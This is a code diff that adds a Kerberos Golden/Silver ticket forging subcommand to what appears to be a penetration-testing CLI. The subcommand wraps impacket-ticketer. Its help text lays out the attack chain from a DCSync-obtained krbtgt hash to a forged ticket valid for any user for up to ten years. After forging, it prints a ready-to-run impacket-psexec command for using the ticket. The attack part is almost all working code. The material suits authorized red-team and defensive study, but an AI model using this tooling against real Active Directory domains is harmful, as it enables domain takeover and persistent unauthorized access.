@@ -2498,6 +2498,43 @@ def cmd_engagements_switch(args):
     return 0
 
 
+def cmd_kerberos_forge(args):
+    """Forge a Golden or Silver ticket via impacket-ticketer.
+    Manual-hint when impacket isn't on PATH; ``args.kind`` picks
+    which sub-flow."""
+    from . import kerberos_forge as kf
+    if args.kind == "golden":
+        result = kf.forge_golden(
+            krbtgt_hash=args.hash,
+            domain=args.domain,
+            domain_sid=args.domain_sid,
+            username=args.user,
+            out_dir=args.out_dir)
+    else:  # silver
+        if not args.spn:
+            _err("--spn is required for silver tickets")
+            return 2
+        result = kf.forge_silver(
+            service_hash=args.hash,
+            domain=args.domain,
+            domain_sid=args.domain_sid,
+            username=args.user,
+            spn=args.spn,
+            out_dir=args.out_dir)
+    if result.kind == "no-tool":
+        _err(result.output)
+        return 2
+    if result.kind == "fail":
+        _err(result.output[:400])
+        return 2
+    print(result.output)
+    if result.ccache_path:
+        print(f"\nticket saved: {result.ccache_path}")
+        print(f"use: KRB5CCNAME={result.ccache_path} "
+              f"impacket-psexec <target> -k -no-pass")
+    return 0
+
+
 def cmd_dpapi_masterkey(args):
     """Decrypt a DPAPI master key file. Wraps impacket-dpapi;
     manual-hint when the tool isn't on PATH."""
@@ -4626,6 +4663,40 @@ the spec is missing that field. `--from-file` reads one credential per line.
     dp_cred.set_defaults(func=cmd_dpapi_credential)
 
     p_dpapi.set_defaults(func=lambda a: _missing(p_dpapi))
+
+    p_kerb = sub.add_parser(
+        "kerberos",
+        help="Kerberos ticket forge (golden / silver)",
+        description="After DCSync lands the krbtgt hash (via esc1/esc8/"
+                    "nopac chains), forge tickets offline. Golden = TGT "
+                    "for any user for up to 10 years (immune to password "
+                    "rotation). Silver = service ticket for one SPN as "
+                    "any user (narrower but doesn't need krbtgt). Wraps "
+                    "impacket-ticketer.")
+    kerb_sub = p_kerb.add_subparsers(dest="kerberos_command",
+                                         metavar="<action>")
+    k_forge = kerb_sub.add_parser(
+        "forge",
+        help="forge a golden or silver ticket via impacket-ticketer")
+    k_forge.add_argument("kind", choices=("golden", "silver"),
+                          help="ticket type")
+    k_forge.add_argument("--user", required=True,
+                          help="username to forge for (e.g. Administrator)")
+    k_forge.add_argument("--hash", required=True,
+                          help="NT hash — krbtgt for golden, service account "
+                               "for silver")
+    k_forge.add_argument("--domain", required=True,
+                          help="AD domain (e.g. CORP.LOCAL)")
+    k_forge.add_argument("--domain-sid", required=True,
+                          help="domain SID (e.g. S-1-5-21-...) from any "
+                               "post-DCSync `impacket-secretsdump` output "
+                               "or `impacket-lookupsid`")
+    k_forge.add_argument("--spn", metavar="SPN",
+                          help="required for silver — e.g. cifs/dc01.corp.local")
+    k_forge.add_argument("--out-dir", metavar="PATH",
+                          help="where to write the .ccache (default: CWD)")
+    k_forge.set_defaults(func=cmd_kerberos_forge)
+    p_kerb.set_defaults(func=lambda a: _missing(p_kerb))
 
     p_refresh = sub.add_parser(
         "refresh",
